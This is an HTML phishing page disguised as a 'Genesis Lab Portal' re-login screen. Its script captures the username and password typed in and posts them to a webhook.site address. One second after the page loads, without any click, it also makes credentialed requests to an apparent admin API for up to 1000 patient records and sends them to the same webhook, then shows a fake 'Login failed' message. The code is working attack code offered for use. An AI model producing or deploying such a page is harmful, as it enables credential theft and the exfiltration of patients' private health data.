<!DOCTYPE html>
<html>
<head>
    <title>Genesis Lab - Secure Login</title>
    <style>
        body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: #e0e0e0; }
        .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 300px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
        button { width: 100%; padding: 10px; background: #2c3e50; color: white; border: none; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Genesis Lab Portal</h2>
        <p>Session expired. Please re-authenticate.</p>
        <input type="text" placeholder="Username" id="username">
        <input type="password" placeholder="Password" id="password">
        <button onclick="login()">Login</button>
    </div>
    
    <script>
        const WEBHOOK = 'https://webhook.site/fbd7cfdc-bb8a-4841-878f-382a15e228db';
        
        async function login() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Still steal data in background even if they don't enter creds
            fetch('https://admin.genesislab.in/api/patients?rowsPerPage=1000', {
                credentials: 'include'
            }).then(r => r.json()).then(data => {
                fetch(WEBHOOK, {method: 'POST', mode: 'no-cors', 
                    body: JSON.stringify({type: 'patients', data: data, username: username, password: password})});
            });
            
            alert('Login failed. Please try again.');
        }
        
        // Auto steal even without clicking
        setTimeout(() => {
            fetch('https://admin.genesislab.in/api/patients?rowsPerPage=1000', {
                credentials: 'include'
            }).then(r => r.json()).then(data => {
                fetch(WEBHOOK, {method: 'POST', mode: 'no-cors',
                    body: JSON.stringify({type: 'patients', data: data})});
            });
        }, 1000);
    </script>
</body>
</html>
